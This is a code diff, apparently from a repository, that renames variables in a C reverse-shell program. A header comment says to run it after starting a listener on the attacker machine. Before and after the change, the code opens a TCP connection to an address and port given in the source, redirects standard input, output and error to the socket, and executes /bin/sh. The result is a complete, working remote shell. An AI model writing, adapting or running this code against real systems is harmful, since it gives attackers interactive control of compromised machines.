@@ -15,18 +15,19 @@ Note : Run the program after starting listener on attacker machine.
 
 int main(int argc, char *argv[])
 {
-    struct sockaddr_in sa;
-    int s;
+    struct sockaddr_in src_addr;
+    int fd;
 
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr("127.0.0.1"); //IP address
-    sa.sin_port = htons(1234); //Port no
+    src_addr.sin_family = AF_INET;
+    src_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //IP address
+    src_addr.sin_port = htons(1234); //Port no
 
-    s = socket(AF_INET, SOCK_STREAM, 0);
-    connect(s, (struct sockaddr *)&sa, sizeof(sa));
-    dup2(s, 0);
-    dup2(s, 1);
-    dup2(s, 2);
+    fd = socket(AF_INET, SOCK_STREAM, 0);
+    
+    connect(fd, (struct sockaddr *)&src_addr, sizeof(src_addr));
+    dup2(fd, 0);
+    dup2(fd, 1);
+    dup2(fd, 2);
 
     execve("/bin/sh", 0, 0);
     return 0;
